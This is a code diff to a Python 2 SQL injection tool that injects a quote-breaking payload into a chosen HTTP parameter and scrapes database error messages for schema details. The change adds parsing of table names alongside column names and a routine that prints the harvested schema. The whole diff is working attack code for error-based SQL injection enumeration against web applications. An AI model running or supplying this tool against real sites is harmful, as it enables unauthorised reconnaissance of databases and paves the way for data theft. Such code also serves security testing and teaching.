@@ -8,6 +8,7 @@ import json
 import re
 
 COOKIE = ""
+TABLES = {}
 
 def send_HTTP_request(url, params):
     global COOKIE
@@ -32,6 +33,7 @@ def check_if_host_vulnerable(url, params, param_to_test):
 
 def list_columns(url, params, param_to_test):
 
+    global TABLES
     columns = []
     params[param_to_test][0] = "' and test=1 and ''='"
 
@@ -41,17 +43,32 @@ def list_columns(url, params, param_to_test):
     if ('not found; SQL statement' in req.content):
         # pattern for the columns
         # TODO: replace with this regex (([a-zA-Z0-9_-]+_)\.([a-zA-Z0-9_-]+)\s)
-        pattern = re.compile(r'(_\.[a-zA-Z0-9_-]+\s)')
-        for column_name in re.findall(pattern, req.content):
-            column_name = column_name[2:-1]
-            if (column_name not in columns):
-                columns.append(column_name)
-                print "[!] Column found : " + column_name
+        # pattern = re.compile(r'(_\.[a-zA-Z0-9_-]+\s)')
+        pattern = re.compile(r'(([a-zA-Z_-]+)[0-9]+_\.([a-zA-Z0-9_-]+)\s)')
+        for res in re.findall(pattern, req.content):
+            table_name = res[1]
+            column_name = res[2]
 
-            
+            if (table_name not in TABLES):
+                TABLES[table_name] = []
+                print "[!] Table found : " + table_name
+
+            if (column_name not in TABLES[table_name]):
+                TABLES[table_name].append(column_name)
+                print "[!] Column found : " + column_name
     else:
         raise Exception('We cannot manage to retrieve columns.')
     
+
+def enumerate_tables_and_columns():
+    global TABLES
+
+    print "[!] Enumerating extracted information"
+    for table in TABLES:
+        print "[" + table + "]"
+        for column in TABLES[table]:
+            print "\t" + column
+
 
 # option parser
 parser = optparse.OptionParser()
@@ -82,3 +99,6 @@ else:
 
    # list columns
     list_columns(url, params, opts.param)
+
+    # enumerate tables and columns found
+    enumerate_tables_and_columns()
